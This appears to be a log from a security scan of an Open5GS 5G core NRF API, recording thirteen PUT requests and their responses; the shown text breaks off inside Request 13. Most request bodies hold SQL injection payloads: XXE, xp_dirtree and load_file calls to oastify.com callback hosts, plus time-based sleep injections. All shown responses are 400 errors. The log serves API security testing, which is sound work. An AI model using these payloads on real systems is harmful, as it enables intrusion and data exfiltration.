@@ -1,0 +1,518 @@
+
+Request Number 1
+
+PUT http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/{nfInstanceID}
+Host: 127.0.0.10
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: application/json
+Content-Encoding: gzip, deflate
+Accept-Encoding: gzip, deflate
+
+(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % gaazk SYSTEM "http://em4w2yscx8agc0sgztnanecz9qfhg56t9h08nybn.oasti'||'fy.com/">%gaazk;]>'),'/l') from dual)
+
+------------------------------------------------------------
+{'content-length': '114',
+ 'content-type': 'application/problem+json',
+ 'date': 'Sun, 02 Apr 2023 18:54:03 GMT',
+ 'server': 'Open5GS v2.4.11-17-g0daef16'}
+--------------------
+{
+	"type":	"/nnrf-nfm/v1",
+	"title":	"No NFProfile",
+	"status":	400,
+	"instance":	"/nf-instances/{nfInstanceID}"
+}
+========================================================================================================================
+
+Request Number 2
+
+PUT http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/{nfInstanceID}
+Host: 127.0.0.10
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: application/json
+Content-Encoding: gzip, deflate
+Accept-Encoding: gzip, deflate
+
+
+{'sNssais': 'value', 'udmInfoList': 'value', 'bsfInfoList': 'value', 'allowedNfDomains': 'value', 'customInfo': 'value', 'ipv6Addresses': 'value', 'plmnList': 'value', 'udmInfo': 'value', 'pcscfInfoList': 'value', 'nfServiceList': 'value', 'nsiList': 'value', 'udsfInfoList': 'value', 'ausfInfoList': 'value', 'interPlmnFqdn': 'value', 'nfSetIdList': 'value', 'allowedPlmns': 'value', 'allowedNssais': 'value', 'olcHSupportInd': 'value', 'bsfInfo': 'value', 'fqdn': 'value', 'serviceSetRecoveryTimeList': 'value', 'udsfInfo': 'value', 'nwdafInfo': 'value', 'lcHSupportInd': 'value', 'locality': 'value', 'gmlcInfo': 'value', 'priority': 'value', 'loadTimeStamp': 'value', 'chfInfo': 'value', 'snpnList': 'value', 'lmfInfo': 'value', 'smfInfo': 'value', 'servingScope': 'value', 'heartBeatTimer': 'value', 'nfProfileChangesSupportInd': 'value', 'hssInfoList': 'value', 'nrfInfo': 'value', 'scpInfo': 'value', 'allowedNfTypes': 'value', 'pcfInfo': 'value', 'nfInstanceName': 'value', 'capacity': 'value', 'chfInfoList': 'value', 'load': 'value', 'nfServices': 'value', 'nfProfileChangesInd': 'value', 'udrInfo': 'value', 'perPlmnSnssaiList': 'value', 'scpDomains': 'value', 'nefInfo': 'value', 'ausfInfo': 'value', 'nfServicePersistence': 'value', 'ipv4Addresses': 'value', 'recoveryTime': 'value', 'nfInstanceId': 'required_value', 'upfInfo': 'value', 'nfStatus': 'required_value', 'amfInfoList': 'value', 'nfType': 'required_value', 'upfInfoList': 'value', 'allowedSnpns': 'value', 'nfSetRecoveryTimeList': 'value', 'udrInfoList': 'value', 'smfInfoList': 'value', 'defaultNotificationSubscriptions': 'value', 'amfInfo': 'value', 'pcfInfoList': 'value'}'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % gaazk SYSTEM "http://b2etiv89d5qdsx8dfq373bswpnvew2mqqeh54vsk.oasti'||'fy.com/">%gaazk;]>'),'/l') from dual)||'
+
+------------------------------------------------------------
+{'content-length': '114',
+ 'content-type': 'application/problem+json',
+ 'date': 'Sun, 02 Apr 2023 18:54:03 GMT',
+ 'server': 'Open5GS v2.4.11-17-g0daef16'}
+--------------------
+{
+	"type":	"/nnrf-nfm/v1",
+	"title":	"No NFProfile",
+	"status":	400,
+	"instance":	"/nf-instances/{nfInstanceID}"
+}
+========================================================================================================================
+
+Request Number 3
+
+PUT http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/{nfInstanceID}
+Host: 127.0.0.10
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: application/json
+Content-Encoding: gzip, deflate
+Accept-Encoding: gzip, deflate
+
+
+{'sNssais': 'value', 'udmInfoList': 'value', 'bsfInfoList': 'value', 'allowedNfDomains': 'value', 'customInfo': 'value', 'ipv6Addresses': 'value', 'plmnList': 'value', 'udmInfo': 'value', 'pcscfInfoList': 'value', 'nfServiceList': 'value', 'nsiList': 'value', 'udsfInfoList': 'value', 'ausfInfoList': 'value', 'interPlmnFqdn': 'value', 'nfSetIdList': 'value', 'allowedPlmns': 'value', 'allowedNssais': 'value', 'olcHSupportInd': 'value', 'bsfInfo': 'value', 'fqdn': 'value', 'serviceSetRecoveryTimeList': 'value', 'udsfInfo': 'value', 'nwdafInfo': 'value', 'lcHSupportInd': 'value', 'locality': 'value', 'gmlcInfo': 'value', 'priority': 'value', 'loadTimeStamp': 'value', 'chfInfo': 'value', 'snpnList': 'value', 'lmfInfo': 'value', 'smfInfo': 'value', 'servingScope': 'value', 'heartBeatTimer': 'value', 'nfProfileChangesSupportInd': 'value', 'hssInfoList': 'value', 'nrfInfo': 'value', 'scpInfo': 'value', 'allowedNfTypes': 'value', 'pcfInfo': 'value', 'nfInstanceName': 'value', 'capacity': 'value', 'chfInfoList': 'value', 'load': 'value', 'nfServices': 'value', 'nfProfileChangesInd': 'value', 'udrInfo': 'value', 'perPlmnSnssaiList': 'value', 'scpDomains': 'value', 'nefInfo': 'value', 'ausfInfo': 'value', 'nfServicePersistence': 'value', 'ipv4Addresses': 'value', 'recoveryTime': 'value', 'nfInstanceId': 'required_value', 'upfInfo': 'value', 'nfStatus': 'required_value', 'amfInfoList': 'value', 'nfType': 'required_value', 'upfInfoList': 'value', 'allowedSnpns': 'value', 'nfSetRecoveryTimeList': 'value', 'udrInfoList': 'value', 'smfInfoList': 'value', 'defaultNotificationSubscriptions': 'value', 'amfInfo': 'value', 'pcfInfoList': 'value'};declare @q varchar(99);set @q='\\cp5u5wva06defyve2rq8qcfxcoifj39r0ho8fv5ju.oasti'+'fy.com\xap'; exec master.dbo.xp_dirtree @q;--
+
+------------------------------------------------------------
+{'content-length': '114',
+ 'content-type': 'application/problem+json',
+ 'date': 'Sun, 02 Apr 2023 18:54:03 GMT',
+ 'server': 'Open5GS v2.4.11-17-g0daef16'}
+--------------------
+{
+	"type":	"/nnrf-nfm/v1",
+	"title":	"No NFProfile",
+	"status":	400,
+	"instance":	"/nf-instances/{nfInstanceID}"
+}
+========================================================================================================================
+
+Request Number 4
+
+PUT http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/{nfInstanceID}
+Host: 127.0.0.10
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: application/json
+Content-Encoding: gzip, deflate
+Accept-Encoding: gzip, deflate
+
+
+{'sNssais': 'value', 'udmInfoList': 'value', 'bsfInfoList': 'value', 'allowedNfDomains': 'value', 'customInfo': 'value', 'ipv6Addresses': 'value', 'plmnList': 'value', 'udmInfo': 'value', 'pcscfInfoList': 'value', 'nfServiceList': 'value', 'nsiList': 'value', 'udsfInfoList': 'value', 'ausfInfoList': 'value', 'interPlmnFqdn': 'value', 'nfSetIdList': 'value', 'allowedPlmns': 'value', 'allowedNssais': 'value', 'olcHSupportInd': 'value', 'bsfInfo': 'value', 'fqdn': 'value', 'serviceSetRecoveryTimeList': 'value', 'udsfInfo': 'value', 'nwdafInfo': 'value', 'lcHSupportInd': 'value', 'locality': 'value', 'gmlcInfo': 'value', 'priority': 'value', 'loadTimeStamp': 'value', 'chfInfo': 'value', 'snpnList': 'value', 'lmfInfo': 'value', 'smfInfo': 'value', 'servingScope': 'value', 'heartBeatTimer': 'value', 'nfProfileChangesSupportInd': 'value', 'hssInfoList': 'value', 'nrfInfo': 'value', 'scpInfo': 'value', 'allowedNfTypes': 'value', 'pcfInfo': 'value', 'nfInstanceName': 'value', 'capacity': 'value', 'chfInfoList': 'value', 'load': 'value', 'nfServices': 'value', 'nfProfileChangesInd': 'value', 'udrInfo': 'value', 'perPlmnSnssaiList': 'value', 'scpDomains': 'value', 'nefInfo': 'value', 'ausfInfo': 'value', 'nfServicePersistence': 'value', 'ipv4Addresses': 'value', 'recoveryTime': 'value', 'nfInstanceId': 'required_value', 'upfInfo': 'value', 'nfStatus': 'required_value', 'amfInfoList': 'value', 'nfType': 'required_value', 'upfInfoList': 'value', 'allowedSnpns': 'value', 'nfSetRecoveryTimeList': 'value', 'udrInfoList': 'value', 'smfInfoList': 'value', 'defaultNotificationSubscriptions': 'value', 'amfInfo': 'value', 'pcfInfoList': 'value'}';declare @q varchar(99);set @q='\\ciyuywoat66e8yoevrj8jc8x5obfc32rtih98wykn.oasti'+'fy.com\uhs'; exec master.dbo.xp_dirtree @q;--
+
+------------------------------------------------------------
+{'content-length': '114',
+ 'content-type': 'application/problem+json',
+ 'date': 'Sun, 02 Apr 2023 18:54:03 GMT',
+ 'server': 'Open5GS v2.4.11-17-g0daef16'}
+--------------------
+{
+	"type":	"/nnrf-nfm/v1",
+	"title":	"No NFProfile",
+	"status":	400,
+	"instance":	"/nf-instances/{nfInstanceID}"
+}
+========================================================================================================================
+
+Request Number 5
+
+PUT http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/{nfInstanceID}
+Host: 127.0.0.10
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: application/json
+Content-Encoding: gzip, deflate
+Accept-Encoding: gzip, deflate
+
+
+{'sNssais': 'value', 'udmInfoList': 'value', 'bsfInfoList': 'value', 'allowedNfDomains': 'value', 'customInfo': 'value', 'ipv6Addresses': 'value', 'plmnList': 'value', 'udmInfo': 'value', 'pcscfInfoList': 'value', 'nfServiceList': 'value', 'nsiList': 'value', 'udsfInfoList': 'value', 'ausfInfoList': 'value', 'interPlmnFqdn': 'value', 'nfSetIdList': 'value', 'allowedPlmns': 'value', 'allowedNssais': 'value', 'olcHSupportInd': 'value', 'bsfInfo': 'value', 'fqdn': 'value', 'serviceSetRecoveryTimeList': 'value', 'udsfInfo': 'value', 'nwdafInfo': 'value', 'lcHSupportInd': 'value', 'locality': 'value', 'gmlcInfo': 'value', 'priority': 'value', 'loadTimeStamp': 'value', 'chfInfo': 'value', 'snpnList': 'value', 'lmfInfo': 'value', 'smfInfo': 'value', 'servingScope': 'value', 'heartBeatTimer': 'value', 'nfProfileChangesSupportInd': 'value', 'hssInfoList': 'value', 'nrfInfo': 'value', 'scpInfo': 'value', 'allowedNfTypes': 'value', 'pcfInfo': 'value', 'nfInstanceName': 'value', 'capacity': 'value', 'chfInfoList': 'value', 'load': 'value', 'nfServices': 'value', 'nfProfileChangesInd': 'value', 'udrInfo': 'value', 'perPlmnSnssaiList': 'value', 'scpDomains': 'value', 'nefInfo': 'value', 'ausfInfo': 'value', 'nfServicePersistence': 'value', 'ipv4Addresses': 'value', 'recoveryTime': 'value', 'nfInstanceId': 'required_value', 'upfInfo': 'value', 'nfStatus': 'required_value', 'amfInfoList': 'value', 'nfType': 'required_value', 'upfInfoList': 'value', 'allowedSnpns': 'value', 'nfSetRecoveryTimeList': 'value', 'udrInfoList': 'value', 'smfInfoList': 'value', 'defaultNotificationSubscriptions': 'value', 'amfInfo': 'value', 'pcfInfoList': 'value'});declare @q varchar(99);set @q='\\r2u9ib8pdlqtsd8tf63n3rscp3vuwim6dy1psci07.oasti'+'fy.com\ayh'; exec master.dbo.xp_dirtree @q;--
+
+------------------------------------------------------------
+{'content-length': '114',
+ 'content-type': 'application/problem+json',
+ 'date': 'Sun, 02 Apr 2023 18:54:03 GMT',
+ 'server': 'Open5GS v2.4.11-17-g0daef16'}
+--------------------
+{
+	"type":	"/nnrf-nfm/v1",
+	"title":	"No NFProfile",
+	"status":	400,
+	"instance":	"/nf-instances/{nfInstanceID}"
+}
+========================================================================================================================
+
+Request Number 6
+
+PUT http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/{nfInstanceID}
+Host: 127.0.0.10
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: application/json
+Content-Encoding: gzip, deflate
+Accept-Encoding: gzip, deflate
+
+
+{'sNssais': 'value', 'udmInfoList': 'value', 'bsfInfoList': 'value', 'allowedNfDomains': 'value', 'customInfo': 'value', 'ipv6Addresses': 'value', 'plmnList': 'value', 'udmInfo': 'value', 'pcscfInfoList': 'value', 'nfServiceList': 'value', 'nsiList': 'value', 'udsfInfoList': 'value', 'ausfInfoList': 'value', 'interPlmnFqdn': 'value', 'nfSetIdList': 'value', 'allowedPlmns': 'value', 'allowedNssais': 'value', 'olcHSupportInd': 'value', 'bsfInfo': 'value', 'fqdn': 'value', 'serviceSetRecoveryTimeList': 'value', 'udsfInfo': 'value', 'nwdafInfo': 'value', 'lcHSupportInd': 'value', 'locality': 'value', 'gmlcInfo': 'value', 'priority': 'value', 'loadTimeStamp': 'value', 'chfInfo': 'value', 'snpnList': 'value', 'lmfInfo': 'value', 'smfInfo': 'value', 'servingScope': 'value', 'heartBeatTimer': 'value', 'nfProfileChangesSupportInd': 'value', 'hssInfoList': 'value', 'nrfInfo': 'value', 'scpInfo': 'value', 'allowedNfTypes': 'value', 'pcfInfo': 'value', 'nfInstanceName': 'value', 'capacity': 'value', 'chfInfoList': 'value', 'load': 'value', 'nfServices': 'value', 'nfProfileChangesInd': 'value', 'udrInfo': 'value', 'perPlmnSnssaiList': 'value', 'scpDomains': 'value', 'nefInfo': 'value', 'ausfInfo': 'value', 'nfServicePersistence': 'value', 'ipv4Addresses': 'value', 'recoveryTime': 'value', 'nfInstanceId': 'required_value', 'upfInfo': 'value', 'nfStatus': 'required_value', 'amfInfoList': 'value', 'nfType': 'required_value', 'upfInfoList': 'value', 'allowedSnpns': 'value', 'nfSetRecoveryTimeList': 'value', 'udrInfoList': 'value', 'smfInfoList': 'value', 'defaultNotificationSubscriptions': 'value', 'amfInfo': 'value', 'pcfInfoList': 'value'}');declare @q varchar(99);set @q='\\oph658vm0idqfavq23qkqof9c0irjf930wonfa5yu.oasti'+'fy.com\hne'; exec master.dbo.xp_dirtree @q;--
+
+------------------------------------------------------------
+{'content-length': '114',
+ 'content-type': 'application/problem+json',
+ 'date': 'Sun, 02 Apr 2023 18:54:03 GMT',
+ 'server': 'Open5GS v2.4.11-17-g0daef16'}
+--------------------
+{
+	"type":	"/nnrf-nfm/v1",
+	"title":	"No NFProfile",
+	"status":	400,
+	"instance":	"/nf-instances/{nfInstanceID}"
+}
+========================================================================================================================
+
+Request Number 7
+
+PUT http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/{nfInstanceID}
+Host: 127.0.0.10
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: application/json
+Content-Encoding: gzip, deflate
+Accept-Encoding: gzip, deflate
+
+(select load_file('\\\\5syn8py33zg7iry75kt1t5iqfhl8mwck3mrdi08ox.oastify.com\\pzv'))
+
+------------------------------------------------------------
+{'content-length': '114',
+ 'content-type': 'application/problem+json',
+ 'date': 'Sun, 02 Apr 2023 18:54:03 GMT',
+ 'server': 'Open5GS v2.4.11-17-g0daef16'}
+--------------------
+{
+	"type":	"/nnrf-nfm/v1",
+	"title":	"No NFProfile",
+	"status":	400,
+	"instance":	"/nf-instances/{nfInstanceID}"
+}
+========================================================================================================================
+
+Request Number 8
+
+PUT http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/{nfInstanceID}
+Host: 127.0.0.10
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: application/json
+Content-Encoding: gzip, deflate
+Accept-Encoding: gzip, deflate
+
+
+{'sNssais': 'value', 'udmInfoList': 'value', 'bsfInfoList': 'value', 'allowedNfDomains': 'value', 'customInfo': 'value', 'ipv6Addresses': 'value', 'plmnList': 'value', 'udmInfo': 'value', 'pcscfInfoList': 'value', 'nfServiceList': 'value', 'nsiList': 'value', 'udsfInfoList': 'value', 'ausfInfoList': 'value', 'interPlmnFqdn': 'value', 'nfSetIdList': 'value', 'allowedPlmns': 'value', 'allowedNssais': 'value', 'olcHSupportInd': 'value', 'bsfInfo': 'value', 'fqdn': 'value', 'serviceSetRecoveryTimeList': 'value', 'udsfInfo': 'value', 'nwdafInfo': 'value', 'lcHSupportInd': 'value', 'locality': 'value', 'gmlcInfo': 'value', 'priority': 'value', 'loadTimeStamp': 'value', 'chfInfo': 'value', 'snpnList': 'value', 'lmfInfo': 'value', 'smfInfo': 'value', 'servingScope': 'value', 'heartBeatTimer': 'value', 'nfProfileChangesSupportInd': 'value', 'hssInfoList': 'value', 'nrfInfo': 'value', 'scpInfo': 'value', 'allowedNfTypes': 'value', 'pcfInfo': 'value', 'nfInstanceName': 'value', 'capacity': 'value', 'chfInfoList': 'value', 'load': 'value', 'nfServices': 'value', 'nfProfileChangesInd': 'value', 'udrInfo': 'value', 'perPlmnSnssaiList': 'value', 'scpDomains': 'value', 'nefInfo': 'value', 'ausfInfo': 'value', 'nfServicePersistence': 'value', 'ipv4Addresses': 'value', 'recoveryTime': 'value', 'nfInstanceId': 'required_value', 'upfInfo': 'value', 'nfStatus': 'required_value', 'amfInfoList': 'value', 'nfType': 'required_value', 'upfInfoList': 'value', 'allowedSnpns': 'value', 'nfSetRecoveryTimeList': 'value', 'udrInfoList': 'value', 'smfInfoList': 'value', 'defaultNotificationSubscriptions': 'value', 'amfInfo': 'value', 'pcfInfoList': 'value'}'+(select load_file('\\\\q6x8macohkuswccsj57m7qwbt2zt0hq5h85zwmmab.oastify.com\\jso'))+'
+
+------------------------------------------------------------
+{'content-length': '114',
+ 'content-type': 'application/problem+json',
+ 'date': 'Sun, 02 Apr 2023 18:54:03 GMT',
+ 'server': 'Open5GS v2.4.11-17-g0daef16'}
+--------------------
+{
+	"type":	"/nnrf-nfm/v1",
+	"title":	"No NFProfile",
+	"status":	400,
+	"instance":	"/nf-instances/{nfInstanceID}"
+}
+========================================================================================================================
+
+Request Number 9
+
+PUT http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/{nfInstanceID}
+Host: 127.0.0.10
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: application/json
+Content-Encoding: gzip, deflate
+Accept-Encoding: gzip, deflate
+
+
+{'sNssais': 'value', 'udmInfoList': 'value', 'bsfInfoList': 'value', 'allowedNfDomains': 'value', 'customInfo': 'value', 'ipv6Addresses': 'value', 'plmnList': 'value', 'udmInfo': 'value', 'pcscfInfoList': 'value', 'nfServiceList': 'value', 'nsiList': 'value', 'udsfInfoList': 'value', 'ausfInfoList': 'value', 'interPlmnFqdn': 'value', 'nfSetIdList': 'value', 'allowedPlmns': 'value', 'allowedNssais': 'value', 'olcHSupportInd': 'value', 'bsfInfo': 'value', 'fqdn': 'value', 'serviceSetRecoveryTimeList': 'value', 'udsfInfo': 'value', 'nwdafInfo': 'value', 'lcHSupportInd': 'value', 'locality': 'value', 'gmlcInfo': 'value', 'priority': 'value', 'loadTimeStamp': 'value', 'chfInfo': 'value', 'snpnList': 'value', 'lmfInfo': 'value', 'smfInfo': 'value', 'servingScope': 'value', 'heartBeatTimer': 'value', 'nfProfileChangesSupportInd': 'value', 'hssInfoList': 'value', 'nrfInfo': 'value', 'scpInfo': 'value', 'allowedNfTypes': 'value', 'pcfInfo': 'value', 'nfInstanceName': 'value', 'capacity': 'value', 'chfInfoList': 'value', 'load': 'value', 'nfServices': 'value', 'nfProfileChangesInd': 'value', 'udrInfo': 'value', 'perPlmnSnssaiList': 'value', 'scpDomains': 'value', 'nefInfo': 'value', 'ausfInfo': 'value', 'nfServicePersistence': 'value', 'ipv4Addresses': 'value', 'recoveryTime': 'value', 'nfInstanceId': 'required_value', 'upfInfo': 'value', 'nfStatus': 'required_value', 'amfInfoList': 'value', 'nfType': 'required_value', 'upfInfoList': 'value', 'allowedSnpns': 'value', 'nfSetRecoveryTimeList': 'value', 'udrInfoList': 'value', 'smfInfoList': 'value', 'defaultNotificationSubscriptions': 'value', 'amfInfo': 'value', 'pcfInfoList': 'value'}'
+
+------------------------------------------------------------
+{'content-length': '114',
+ 'content-type': 'application/problem+json',
+ 'date': 'Sun, 02 Apr 2023 18:54:03 GMT',
+ 'server': 'Open5GS v2.4.11-17-g0daef16'}
+--------------------
+{
+	"type":	"/nnrf-nfm/v1",
+	"title":	"No NFProfile",
+	"status":	400,
+	"instance":	"/nf-instances/{nfInstanceID}"
+}
+========================================================================================================================
+
+Request Number 10
+
+PUT http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/{nfInstanceID}
+Host: 127.0.0.10
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: application/json
+Content-Encoding: gzip, deflate
+Accept-Encoding: gzip, deflate
+
+
+{'sNssais': 'value', 'udmInfoList': 'value', 'bsfInfoList': 'value', 'allowedNfDomains': 'value', 'customInfo': 'value', 'ipv6Addresses': 'value', 'plmnList': 'value', 'udmInfo': 'value', 'pcscfInfoList': 'value', 'nfServiceList': 'value', 'nsiList': 'value', 'udsfInfoList': 'value', 'ausfInfoList': 'value', 'interPlmnFqdn': 'value', 'nfSetIdList': 'value', 'allowedPlmns': 'value', 'allowedNssais': 'value', 'olcHSupportInd': 'value', 'bsfInfo': 'value', 'fqdn': 'value', 'serviceSetRecoveryTimeList': 'value', 'udsfInfo': 'value', 'nwdafInfo': 'value', 'lcHSupportInd': 'value', 'locality': 'value', 'gmlcInfo': 'value', 'priority': 'value', 'loadTimeStamp': 'value', 'chfInfo': 'value', 'snpnList': 'value', 'lmfInfo': 'value', 'smfInfo': 'value', 'servingScope': 'value', 'heartBeatTimer': 'value', 'nfProfileChangesSupportInd': 'value', 'hssInfoList': 'value', 'nrfInfo': 'value', 'scpInfo': 'value', 'allowedNfTypes': 'value', 'pcfInfo': 'value', 'nfInstanceName': 'value', 'capacity': 'value', 'chfInfoList': 'value', 'load': 'value', 'nfServices': 'value', 'nfProfileChangesInd': 'value', 'udrInfo': 'value', 'perPlmnSnssaiList': 'value', 'scpDomains': 'value', 'nefInfo': 'value', 'ausfInfo': 'value', 'nfServicePersistence': 'value', 'ipv4Addresses': 'value', 'recoveryTime': 'value', 'nfInstanceId': 'required_value', 'upfInfo': 'value', 'nfStatus': 'required_value', 'amfInfoList': 'value', 'nfType': 'required_value', 'upfInfoList': 'value', 'allowedSnpns': 'value', 'nfSetRecoveryTimeList': 'value', 'udrInfoList': 'value', 'smfInfoList': 'value', 'defaultNotificationSubscriptions': 'value', 'amfInfo': 'value', 'pcfInfoList': 'value'}'(select*from(select(sleep(20)))a)'
+
+------------------------------------------------------------
+{'content-length': '114',
+ 'content-type': 'application/problem+json',
+ 'date': 'Sun, 02 Apr 2023 18:54:03 GMT',
+ 'server': 'Open5GS v2.4.11-17-g0daef16'}
+--------------------
+{
+	"type":	"/nnrf-nfm/v1",
+	"title":	"No NFProfile",
+	"status":	400,
+	"instance":	"/nf-instances/{nfInstanceID}"
+}
+========================================================================================================================
+
+Request Number 11
+
+PUT http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/{nfInstanceID}
+Host: 127.0.0.10
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: application/json
+Content-Encoding: gzip, deflate
+Accept-Encoding: gzip, deflate
+
+
+{'sNssais': 'value', 'udmInfoList': 'value', 'bsfInfoList': 'value', 'allowedNfDomains': 'value', 'customInfo': 'value', 'ipv6Addresses': 'value', 'plmnList': 'value', 'udmInfo': 'value', 'pcscfInfoList': 'value', 'nfServiceList': 'value', 'nsiList': 'value', 'udsfInfoList': 'value', 'ausfInfoList': 'value', 'interPlmnFqdn': 'value', 'nfSetIdList': 'value', 'allowedPlmns': 'value', 'allowedNssais': 'value', 'olcHSupportInd': 'value', 'bsfInfo': 'value', 'fqdn': 'value', 'serviceSetRecoveryTimeList': 'value', 'udsfInfo': 'value', 'nwdafInfo': 'value', 'lcHSupportInd': 'value', 'locality': 'value', 'gmlcInfo': 'value', 'priority': 'value', 'loadTimeStamp': 'value', 'chfInfo': 'value', 'snpnList': 'value', 'lmfInfo': 'value', 'smfInfo': 'value', 'servingScope': 'value', 'heartBeatTimer': 'value', 'nfProfileChangesSupportInd': 'value', 'hssInfoList': 'value', 'nrfInfo': 'value', 'scpInfo': 'value', 'allowedNfTypes': 'value', 'pcfInfo': 'value', 'nfInstanceName': 'value', 'capacity': 'value', 'chfInfoList': 'value', 'load': 'value', 'nfServices': 'value', 'nfProfileChangesInd': 'value', 'udrInfo': 'value', 'perPlmnSnssaiList': 'value', 'scpDomains': 'value', 'nefInfo': 'value', 'ausfInfo': 'value', 'nfServicePersistence': 'value', 'ipv4Addresses': 'value', 'recoveryTime': 'value', 'nfInstanceId': 'required_value', 'upfInfo': 'value', 'nfStatus': 'required_value', 'amfInfoList': 'value', 'nfType': 'required_value', 'upfInfoList': 'value', 'allowedSnpns': 'value', 'nfSetRecoveryTimeList': 'value', 'udrInfoList': 'value', 'smfInfoList': 'value', 'defaultNotificationSubscriptions': 'value', 'amfInfo': 'value', 'pcfInfoList': 'value'}'+(select*from(select(sleep(20)))a)+'
+
+------------------------------------------------------------
+{'content-length': '114',
+ 'content-type': 'application/problem+json',
+ 'date': 'Sun, 02 Apr 2023 18:54:03 GMT',
+ 'server': 'Open5GS v2.4.11-17-g0daef16'}
+--------------------
+{
+	"type":	"/nnrf-nfm/v1",
+	"title":	"No NFProfile",
+	"status":	400,
+	"instance":	"/nf-instances/{nfInstanceID}"
+}
+========================================================================================================================
+
+Request Number 12
+
+PUT http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/{nfInstanceID}
+Host: 127.0.0.10
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: application/json
+Content-Encoding: gzip, deflate
+Accept-Encoding: gzip, deflate
+
+
+{'sNssais': 'value', 'udmInfoList': 'value', 'bsfInfoList': 'value', 'allowedNfDomains': 'value', 'customInfo': 'value', 'ipv6Addresses': 'value', 'plmnList': 'value', 'udmInfo': 'value', 'pcscfInfoList': 'value', 'nfServiceList': 'value', 'nsiList': 'value', 'udsfInfoList': 'value', 'ausfInfoList': 'value', 'interPlmnFqdn': 'value', 'nfSetIdList': 'value', 'allowedPlmns': 'value', 'allowedNssais': 'value', 'olcHSupportInd': 'value', 'bsfInfo': 'value', 'fqdn': 'value', 'serviceSetRecoveryTimeList': 'value', 'udsfInfo': 'value', 'nwdafInfo': 'value', 'lcHSupportInd': 'value', 'locality': 'value', 'gmlcInfo': 'value', 'priority': 'value', 'loadTimeStamp': 'value', 'chfInfo': 'value', 'snpnList': 'value', 'lmfInfo': 'value', 'smfInfo': 'value', 'servingScope': 'value', 'heartBeatTimer': 'value', 'nfProfileChangesSupportInd': 'value', 'hssInfoList': 'value', 'nrfInfo': 'value', 'scpInfo': 'value', 'allowedNfTypes': 'value', 'pcfInfo': 'value', 'nfInstanceName': 'value', 'capacity': 'value', 'chfInfoList': 'value', 'load': 'value', 'nfServices': 'value', 'nfProfileChangesInd': 'value', 'udrInfo': 'value', 'perPlmnSnssaiList': 'value', 'scpDomains': 'value', 'nefInfo': 'value', 'ausfInfo': 'value', 'nfServicePersistence': 'value', 'ipv4Addresses': 'value', 'recoveryTime': 'value', 'nfInstanceId': 'required_value', 'upfInfo': 'value', 'nfStatus': 'required_value', 'amfInfoList': 'value', 'nfType': 'required_value', 'upfInfoList': 'value', 'allowedSnpns': 'value', 'nfSetRecoveryTimeList': 'value', 'udrInfoList': 'value', 'smfInfoList': 'value', 'defaultNotificationSubscriptions': 'value', 'amfInfo': 'value', 'pcfInfoList': 'value'}' and (select*from(select(sleep(20)))a)--
+
+------------------------------------------------------------
+{'content-length': '114',
+ 'content-type': 'application/problem+json',
+ 'date': 'Sun, 02 Apr 2023 18:54:03 GMT',
+ 'server': 'Open5GS v2.4.11-17-g0daef16'}
+--------------------
+{
+	"type":	"/nnrf-nfm/v1",
+	"title":	"No NFProfile",
+	"status":	400,
+	"instance":	"/nf-instances/{nfInstanceID}"
+}
+========================================================================================================================
+
+Request Number 13
+
+PUT http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/{nfInstanceID}
+Host: 127.0.0.10
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: application/json
+Content-Encoding: gzip, deflate
+Accept-Encoding: gzip, deflate
+
+
